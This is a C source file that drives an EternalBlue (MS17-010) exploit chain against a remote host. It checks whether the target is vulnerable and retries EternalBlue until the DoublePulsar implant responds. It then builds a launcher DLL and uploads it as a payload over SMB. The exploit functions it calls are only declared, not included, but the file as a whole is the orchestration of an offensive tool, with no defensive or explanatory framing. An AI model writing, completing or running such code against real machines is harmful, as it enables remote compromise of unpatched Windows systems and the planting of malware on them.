#include <stdio.h>
#include "config.h"

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int status;
    int attempt;
    int eternalblue_succeeded = 0;
    int doublepulsar_active = 0;

    (void)payload_path;

    printf("Checking MS17-010 vulnerability on %s:%d\n", ip, port);
    status = ms17_vuln_status(ip, port);
    if (status <= 0) {
        printf("MS17-010 vulnerability check failed or target is not vulnerable\n");
        return -1;
    }

    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        printf("EternalBlue attempt %d of %d on %s:%d\n",
               attempt + 1, MAX_RETRIES, ip, port);
        status = EternalBlue(ip, port);
        if (status == 0) {
            eternalblue_succeeded = 1;
            printf("EternalBlue attempt succeeded; checking for DoublePulsar\n");
            status = doublepulsar_check(ip, port);
            if (status > 0) {
                doublepulsar_active = 1;
                printf("DoublePulsar is active\n");
                break;
            }
            printf("DoublePulsar is not active; retrying\n");
        } else {
            printf("EternalBlue attempt failed\n");
        }
    }

    if (!doublepulsar_active) {
        if (!eternalblue_succeeded) {
            printf("No EternalBlue attempt succeeded\n");
            return -2;
        }
        printf("DoublePulsar was not detected after the retries\n");
        return -3;
    }

    printf("Building launcher DLL\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("Failed to build launcher DLL\n");
        return -4;
    }

    printf("Uploading payload to %s:%d\n", ip, port);
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("Failed to upload payload\n");
        return -5;
    }

    printf("EternalBlue payload pipeline completed successfully\n");
    return 0;
}